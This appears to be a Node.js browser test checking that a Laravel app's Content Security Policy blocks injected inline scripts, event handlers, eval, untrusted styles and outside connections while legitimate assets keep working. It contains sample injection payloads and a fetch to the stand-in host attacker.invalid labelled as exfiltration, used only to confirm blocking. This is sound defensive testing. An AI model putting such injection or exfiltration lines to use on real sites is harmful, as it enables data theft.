import assert from 'node:assert/strict';
import { spawn, spawnSync } from 'node:child_process';
import { createServer } from 'node:http';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, resolve, sep } from 'node:path';
import { fileURLToPath } from 'node:url';
import test from 'node:test';

const root = resolve(dirname(fileURLToPath(import.meta.url)), '../..');

test('real CSP blocks injected code while Tabler, ApexCharts and page actions work', async () => {
    const directory = mkdtempSync(join(tmpdir(), 'risfm-csp-browser-'));
    const php = String.raw`
require 'vendor/autoload.php';
$app = require 'bootstrap/app.php';
$app->make(Illuminate\Contracts\Console\Kernel::class)->bootstrap();
$app['config']->set('broadcasting.connections.pusher.options.cluster', 'eu');
$response = $app->make(App\Http\Middleware\AddContentSecurityPolicy::class)->handle(
    Illuminate\Http\Request::create('/'), fn () => response('Test.', 200, ['Content-Type' => 'text/html'])
);
echo json_encode(['policy' => $response->headers->get('Content-Security-Policy'), 'nonce' => Illuminate\Support\Facades\Vite::cspNonce()]);
`;
    const configuration = spawnSync('php', ['-r', php], {
        cwd: root, encoding: 'utf8',
        env: { ...process.env, APP_ENV: 'testing', DB_CONNECTION: 'sqlite', DB_DATABASE: ':memory:', CACHE_STORE: 'array' },
    });
    assert.equal(configuration.status, 0, configuration.stderr);
    const { policy, nonce } = JSON.parse(configuration.stdout);
    const manifest = JSON.parse(readFileSync(join(root, 'public/build/manifest.json'), 'utf8'));
    const scriptPath = '/build/' + manifest['resources/js/app.js'].file;
    const styles = [...new Set(Object.values(manifest).filter(entry => entry.file.endsWith('.css')).map(entry => entry.file))];
    const backups = readFileSync(join(root, 'resources/views/backups/index.blade.php'), 'utf8');
    const backupScript = backups.match(/@push\('scripts'\)\s*<script\b[^>]*>([\s\S]*?)<\/script>/);
    assert.ok(backupScript);
    const backupMarkup = backups.slice(0, backupScript.index);
    const roleSource = readFileSync(join(root, 'resources/views/administration/roles/index.blade.php'), 'utf8');
    const roleScript = roleSource.match(/@push\('scripts'\)\s*<script\b[^>]*>([\s\S]*?)<\/script>/);
    assert.ok(roleScript);
    const setup = `
        window.cspViolations = [];
        document.addEventListener('securitypolicyviolation', event => {
            window.cspViolations.push({ directive: event.effectiveDirective, blocked: event.blockedURI });
        });
        window.backupCalls = 0;
        const originalFetch = window.fetch;
        window.fetch = (url, options) => String(url).startsWith('/backups')
            ? (window.backupCalls++, Promise.resolve({ ok: true, json: async () => ({ data: [], meta: { total: 0, current_page: 1, last_page: 1, per_page: 20 } }) }))
            : originalFetch(url, options);
        window.copiedText = null;
        Object.defineProperty(navigator, 'clipboard', { value: { writeText: async text => { window.copiedText = text; } } });
    `;
    const checks = `
        document.addEventListener('DOMContentLoaded', async () => {
            const result = document.getElementById('csp-result');
            const check = (value, label) => { if (!value) throw new Error(label); };
            const wait = () => new Promise(resolve => setTimeout(resolve, 200));
            try {
                await wait();
                check(window.tabler?.Modal, 'Tabler did not load');
                check(typeof window.ApexCharts === 'function', 'ApexCharts did not load');
                const chart = new window.ApexCharts(document.getElementById('csp-chart'), {
                    chart: { type: 'area', height: 180, animations: { enabled: false }, toolbar: { show: false } },
                    series: [{ name: 'Forms', data: [1, 3, 2] }],
                    xaxis: { categories: ['One', 'Two', 'Three'] },
                });
                await chart.render();
                check(document.querySelector('#csp-chart svg'), 'Chart was not rendered');
                check(window.Apex.chart.nonce === ${JSON.stringify(nonce)}, 'ApexCharts nonce is missing');

                document.querySelector('[data-role-permissions-all][data-check="true"]').click();
                check(document.getElementById('role-check').checked, 'Select all permissions failed');
                document.querySelector('[data-role-permissions-all][data-check="false"]').click();
                check(!document.getElementById('role-check').checked, 'Clear permissions failed');
                const checkbox = document.getElementById('role-check');
                checkbox.checked = true;
                checkbox.dispatchEvent(new Event('change', { bubbles: true }));
                check(document.getElementById('active-count-test-role').textContent === '1', 'Permission counter failed');

                const before = window.backupCalls;
                const submit = new Event('submit', { bubbles: true, cancelable: true });
                document.getElementById('filter-form').dispatchEvent(submit);
                check(submit.defaultPrevented && window.backupCalls === before + 1, 'Backup filters failed');

                let submissions = 0;
                document.getElementById('auto-form').submit = () => { submissions++; };
                document.getElementById('auto-input').dispatchEvent(new Event('change', { bubbles: true }));
                check(submissions === 1, 'Mission filter auto-submit failed');
                document.querySelector('[data-copy-target]').click();
                await wait();
                check(window.copiedText === 'Audit metadata', 'Audit copy failed');

                document.getElementById('csp-theme').click();
                await wait();
                check(document.documentElement.getAttribute('data-bs-theme') === 'dark', 'Theme switch failed');

                try { eval('window.evilEval = true'); } catch (error) { window.evalBlocked = true; }
                const untrustedStyle = document.createElement('style');
                untrustedStyle.id = 'untrusted-style';
                untrustedStyle.textContent = '#csp-style-target { color: rgb(255, 0, 255) !important; }';
                document.head.appendChild(untrustedStyle);
                await fetch('https://attacker.invalid/csp-exfiltration', { mode: 'no-cors' }).catch(() => {});
                await wait();
                check(!window.evilInline && !window.evilHandler && !window.evilEval && window.evalBlocked, 'Injected code executed');
                check(getComputedStyle(document.getElementById('csp-style-target')).color !== 'rgb(255, 0, 255)', 'Untrusted styles executed');
                check(window.cspViolations.some(event => event.directive === 'script-src-attr'), 'Missing event-handler block');
                check(window.cspViolations.some(event => event.directive === 'script-src-elem' && event.blocked === 'inline'), 'Missing inline-script block');
                check(window.cspViolations.some(event => event.directive === 'style-src-elem' && event.blocked === 'inline'), 'Missing inline-style block');
                check(window.cspViolations.some(event => event.directive === 'connect-src' && event.blocked.startsWith('https://attacker.invalid')), 'Missing external-connection block');
                check(!window.cspViolations.some(event => event.blocked.includes('/build/')), 'Local assets were blocked');
                result.textContent = 'PASS:CSP';
            } catch (error) {
                result.textContent = 'FAIL:' + error.message + '|' + JSON.stringify(window.cspViolations);
            }
        });
    `;
    const html = `<!doctype html><html lang="fr" data-bs-theme="light"><head><meta charset="utf-8"><meta property="csp-nonce" nonce="${nonce}"><meta name="csrf-token" content="test-token">
        ${styles.map(file => `<link nonce="${nonce}" rel="stylesheet" href="/build/${file}">`).join('')}
        <script nonce="${nonce}">${setup}</script><script type="module" nonce="${nonce}" src="${scriptPath}"></script>
        </head><body>${backupMarkup}
        <button id="csp-theme" data-theme-toggle type="button">Theme</button><div id="csp-chart"></div><p id="csp-style-target">Styles</p>
        <label class="form-check"><input id="role-check" type="checkbox" class="role-perm-checkbox-test-role" data-role-permission-toggle="test-role"></label>
        <span id="active-count-test-role">0</span><span id="nav-count-test-role">0 / 3</span>
        <button type="button" data-role-permissions-all="test-role" data-check="true">All</button><button type="button" data-role-permissions-all="test-role" data-check="false">None</button>
        <form id="auto-form"><input id="auto-input" data-auto-submit></form><pre id="copy-metadata">Audit metadata</pre><button type="button" data-copy-target="copy-metadata">Copy</button>
        <pre id="csp-result">PENDING</pre><script>window.evilInline=true;</script><img src="/missing" onerror="window.evilHandler=true">
        <script nonce="${nonce}">${backupScript[1].replace(/\{\{[^}]+\}\}/g, '/backups')}</script>
        <script nonce="${nonce}">${roleScript[1].replace(/\{\{[^}]+\}\}/g, '3')}</script><script nonce="${nonce}">${checks}</script></body></html>`;
    const publicRoot = join(root, 'public');
    const server = createServer((request, response) => {
        const path = new URL(request.url, 'http://localhost').pathname;
        if (path === '/') {
            response.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Content-Security-Policy': policy, 'X-Frame-Options': 'DENY' });
            response.end(html);
            return;
        }
        const file = resolve(publicRoot, '.' + path);
        if (!file.startsWith(publicRoot + sep)) { response.writeHead(404).end(); return; }
        try {
            const content = readFileSync(file);
            const type = file.endsWith('.js') ? 'application/javascript' : file.endsWith('.css') ? 'text/css' : file.endsWith('.woff2') ? 'font/woff2' : 'application/octet-stream';
            response.writeHead(200, { 'Content-Type': type });
            response.end(content);
        } catch (error) { response.writeHead(404).end(); }
    });
    try {
        await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
        const browser = spawn(process.env.BROWSER_BIN || 'google-chrome', [
            '--headless', '--no-sandbox', '--disable-gpu', '--disable-extensions', '--no-first-run', '--disable-background-networking',
            '--force-prefers-reduced-motion',
            '--host-resolver-rules=MAP *.pusher.com ~NOTFOUND, MAP attacker.invalid ~NOTFOUND',
            '--user-data-dir=' + join(directory, 'chrome-profile'), '--virtual-time-budget=6000', '--dump-dom',
            'http://127.0.0.1:' + server.address().port,
        ]);
        let output = '';
        let errors = '';
        browser.stdout.on('data', data => { output += data; });
        browser.stderr.on('data', data => { errors += data; });
        const timeout = setTimeout(() => browser.kill('SIGKILL'), 30000);
        const status = await new Promise((resolve, reject) => { browser.once('error', reject); browser.once('close', resolve); });
        clearTimeout(timeout);
        assert.equal(status, 0, errors);
        const result = output.match(/<pre id="csp-result">([^<]*)<\/pre>/)?.[1];
        assert.equal(result, 'PASS:CSP', result || 'The browser did not finish the CSP checks.');
    } finally {
        await new Promise(resolve => server.close(resolve));
        rmSync(directory, { recursive: true, force: true });
    }
});
